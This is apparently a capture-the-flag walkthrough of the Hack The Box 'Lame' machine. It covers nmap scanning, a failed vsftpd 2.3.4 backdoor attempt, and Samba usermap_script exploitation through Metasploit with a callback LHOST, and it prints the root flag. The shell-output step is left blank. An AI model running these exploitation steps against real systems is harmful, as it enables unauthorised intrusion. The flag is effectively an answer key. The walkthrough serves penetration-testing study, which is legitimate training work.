## Port Scan

Machine IP address: 10.10.10.3

I start solving the machine by running an nmap scan.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> nmap --top-ports 1000 10.10.10.3<br>
Nmap scan report for 10.10.10.3<br>
Host is up (0.11s latency).<br>
Not shown: 996 filtered tcp ports (no-response)<br>
PORT    STATE SERVICE<br>
21/tcp  open  ftp<br>
22/tcp  open  ssh<br>
139/tcp open  netbios-ssn<br>
445/tcp open  microsoft-ds<br>
</div>

The nmap results show 4 open ports. To gather more information about these ports, I run a more detailed nmap scan. I use the -sV and -sC parameters to learn the service versions and run the default Nmap scripts for more detailed information about the target.

<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> nmap -sV -sC 10.10.10.3
</div>

<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/htb_lame/porttarama.webp' | relative_url }}" width="740" height="420" alt="vsftpd and Samba service versions found by the nmap -sV -sC scan">
</div>

The output gives us some nice information. The FTP service is running vsftpd 2.3.4, a very old version with a serious backdoor vulnerability. This version may allow attackers to gain remote system access due to a vulnerability known as CVE-2011-2523. We also notice that anonymous login is allowed.
Another piece of information is that the Samba service is running Samba 3.0.20, which is known for an RCE vulnerability. This version has the CVE-2007-2447 vulnerability.

## Exploit

I want to start the exploitation process by using the known vulnerability in vsFTPd 2.3.4. This flaw allows us to gain access to the system via a backdoor.

I searched Metasploit by version name to see if there was a module for vsFTPd 2.3.4, and found two modules.

<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> searchsploit vsFTPd 2.3.4
</div>

<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/htb_lame/exploitmodul.webp' | relative_url }}" width="940" height="120" alt="Exploit modules found by the searchsploit vsFTPd 2.3.4 query">
</div>

Let's try this vulnerability with msfconsole. After selecting the module, let's look at the settings it wants us to configure.

<div class="code-window">
<br>
msf6 exploit<span class="highlight">(unix/ftp/vsftpd_234_backdoor)</span> > show options
</div>

<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/htb_lame/showoptions.webp' | relative_url }}" width="1000" height="200" alt="Show options output for the Metasploit vsftpd_234_backdoor module">
</div>

It asks us for the host and port number of the victim we'll be attacking. Let's enter the required values.

<div class="code-window">
<br>
msf6 exploit<span class="highlight">(unix/ftp/vsftpd_234_backdoor)</span> > set RHOSTS 10.10.10.3<br>RHOSTS => 10.10.10.3<br>
msf6 exploit<span class="highlight">(unix/ftp/vsftpd_234_backdoor)</span> > set RPORT 21 <br>RPORT => 21
</div>

You can run show options again to double-check the settings. Once everything is set, I start the exploit by running it.

<div class="code-window">
<br>
msf6 exploit<span class="highlight">(unix/ftp/vsftpd_234_backdoor)</span> ) > run<br>
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)<br>
[*] 10.10.10.3:21 - USER: 331 Please specify the password.<br>
[*] Exploit completed, but no session was created.<br>
</div>

However, the command's output shows that the backdoor wasn't triggered successfully. This vulnerability may have been patched on the system.
We can try exploiting the other port. If you remember, the other vulnerable service we found in the scan was Samba 3.0.20. Let's search for this vulnerability in msfconsole as well.

<div class="code-window">
<br>
msf6 > search Samba 3.0.20
</div>

<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/htb_lame/sambamodul.webp' | relative_url }}" width="1000" height="170" alt="Modules found by searching for Samba 3.0.20 in Metasploit">
</div>

We can exploit the system using this module's abuse of Samba's username map script feature. This feature is normally a script that maps usernames to system users. However, in older Samba versions, this script executes whatever is written in place of the username — for example a sentence like 'create me a backdoor!' — as a command, allowing attackers to take over the system using this flaw.
Let's use the module with the "use" command and view its settings.

<div class="code-window">
<br>
msf6 exploit<span class="highlight">(multi/samba/usermap_script)</span> > show options 
</div>

<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/htb_lame/sambashow.webp' | relative_url }}" width="1000" height="300" alt="Show options output for the Metasploit usermap_script module">
</div>

Let's set the parameters/settings needed to exploit the vulnerability.
<div class="code-window">
<br>
msf6 exploit<span class="highlight">(multi/samba/usermap_script)</span> > set RHOSTS 10.10.10.3<br>
RHOSTS => 10.10.10.3
</div>

If you're using a VPN, you need to enter your own VPN IP address as the listening address.
<div class="code-window">
<br>
msf6 exploit<span class="highlight">(multi/samba/usermap_script)</span> > set LHOST 10.10.14.34<br>
LHOST => 10.10.14.34
</div>

Running the run command opens a shell.

<div class="code-window">

</div>

We found the user flag. Now it's time for the root flag.

## Root Flag

Let's go back to the top of the filesystem and look for the root.txt file in the root account.

<div class="code-window">
<br>
cd ~<br>
pwd<br>
/root<br>
</div>

We're at the root level. Let's view the files.
<div class="code-window">
<br>
ls<br>
Desktop<br>
reset_logs.sh<br>
root.txt<br>
vnc.log<br>
</div>

Bingo again! We found the root.txt file. Let's read its contents.
<div class="code-window">
<br>
cat root.txt<br>
3b214871e776d27b1aa4d22c0d7c3894
</div>

We've also obtained the root flag. We've solved the machine.
